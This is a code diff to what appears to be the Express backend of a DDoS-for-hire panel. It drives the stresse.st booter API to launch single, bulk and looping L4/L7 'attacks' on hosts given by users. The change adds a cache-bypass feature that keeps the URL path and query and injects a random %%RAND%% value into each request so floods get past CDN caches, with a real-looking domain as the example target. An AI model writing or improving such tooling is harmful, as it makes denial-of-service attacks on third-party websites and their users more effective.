@@ -487,8 +487,8 @@ async function stopAttackApi(apiClient, apiToken, attackId) {
 
 function buildApiUrl(apiToken, params) {
   const isL7 = params.layer === 'L7';
-  const bareHost = normalizeHost(params.host);
-  const host = isL7 ? `https://${bareHost}` : bareHost;
+  // L7'de path/query korunur (cache-bypass); L4'te sade bare host kullanilir.
+  const host = isL7 ? buildL7HostWithProtocol(params.host) : normalizeHost(params.host);
   const geo = params.geo || 'worldwide';
   const method = String(params.method || '');
   const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
@@ -711,7 +711,8 @@ function resolveNoteForRow(username, rawTarget, method) {
   for (const loop of Object.values(activeLoops)) {
     if (!loop.running || !loop.note) continue;
     if (getLoopOwner(loop) !== username) continue;
-    if (String(loop.params?.host || '').toLowerCase() === host &&
+    // loop.params.host sorgulu olabilir (cache-bypass); karsilastirma bare host ile
+    if (normalizeHost(loop.params?.host || '') === host &&
         String(loop.params?.method || '').toLowerCase() === m) {
       return loop.note;
     }
@@ -1123,6 +1124,29 @@ function normalizeHost(host) {
   h = h.split('#')[0];
   h = h.replace(/:\d+$/, '');
   return h.toLowerCase();
+}
+
+// L7 hedefleri icin path/query KORUYAN normalize: "https://eightfy.com/?s=%%RAND%%"
+// -> "eightfy.com/?s=%%RAND%%". Edge/CDN cache'ini delmek (cache-bypass) icin
+// sorgulu URL'ler gerekiyor; %%RAND%% her stresse cagrisinda rastgele degerle
+// degistirilir (buildApiUrl). Bosluk iceren veya 200 karakteri asan girdi reddedilir.
+function normalizeL7Host(host) {
+  if (!host || typeof host !== 'string') return '';
+  const h = host.trim().replace(/^https?:\/\//i, '');
+  if (/\s/.test(h)) return '';
+  const bare = normalizeHost(h);
+  if (!bare) return '';
+  const slashIdx = h.indexOf('/');
+  const rest = slashIdx >= 0 ? h.slice(slashIdx) : '';
+  const out = bare + rest;
+  return out.length <= 200 ? out : '';
+}
+
+// buildApiUrl icin L7 host'u hazirla: protokol ekle ve %%RAND%% placeholder'ini
+// her cagrida taze rastgele degerle degistir (cache-bypass).
+function buildL7HostWithProtocol(rawHost) {
+  const h = String(rawHost || '').trim().replace(/^https?:\/\//i, '');
+  return `https://${h}`.replace(/%%RAND%%/g, () => Math.random().toString(36).slice(2, 10));
 }
 
 /**
@@ -1675,7 +1699,8 @@ app.post('/api/stresse/attack', async (req, res) => {
     if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
       return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
     }
-    const host = normalizeHost(rawHost);
+    // L7'de path/query korunur (cache-bypass); L4'te bare host.
+    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
     if (!host || !port || !time || !method) {
       return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
     }
@@ -1754,7 +1779,8 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
     if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
       return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
     }
-    const host = normalizeHost(rawHost);
+    // L7'de path/query korunur (cache-bypass); L4'te bare host.
+    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
     if (!host || !port || !time || !method) {
       return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
     }
@@ -1846,7 +1872,8 @@ app.post('/api/stresse/test-api', async (req, res) => {
 
     const { port, time, method, geo = 'worldwide', layer = 'L4', concurrents = 1, apiToken: bodyToken } = req.body;
     const rawHost = req.body.host;
-    const host = normalizeHost(rawHost);
+    // L7'de path/query korunur (cache-bypass); L4'te bare host.
+    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
     if (!host || !port || !time || !method) {
       return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
     }
@@ -2254,13 +2281,15 @@ app.post('/api/stresse/loop', async (req, res) => {
     const { port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
     const note = sanitizeNote(req.body.note);
     const rawHost = req.body.host;
-    const host = normalizeHost(rawHost);
+    // L7'de path/query korunur (cache-bypass); L4'te bare host zorunlu.
+    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
     if (!host || !port || !time || !method) {
       return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
     }
     // Loop ID'yi normalize edilmis host uzerinden backend uretir; frontend'in URL protokolu iceren
     // loop ID'leri gecersiz olur. Frontend response'taki loopId'yi kullanir.
-    const loopId = `${host}:${port}_${method}_${Date.now()}`;
+    // Sorgulu L7 hedeflerinde query ID'ye girmesin diye bare host kullanilir.
+    const loopId = `${normalizeHost(rawHost) || host}:${port}_${method}_${Date.now()}`;
     console.log(`[loop/create] ${host}:${port} ${method} layer=${layer} time=${time} concurrents=${concurrents} interval=${interval}`);
 
     if (isFreeMethod(method)) {
@@ -2271,8 +2300,9 @@ app.post('/api/stresse/loop', async (req, res) => {
     // varsa ikincisini baslatma (cift tiklama / ilk tur beklerken tekrar
     // basma ile olusan mukerrer loop'lar birikim yaratiyordu).
     const methodLower = String(method).toLowerCase();
+    const bareHost = normalizeHost(rawHost) || host;
     const duplicate = Object.values(activeLoops).find((l) => l.running
-      && l.params?.host === host
+      && (normalizeHost(l.params?.host) || l.params?.host) === bareHost
       && parseInt(l.params?.port) === parseInt(port)
       && String(l.params?.method || '').toLowerCase() === methodLower
       && (l.params?.layer || 'L4') === layer);
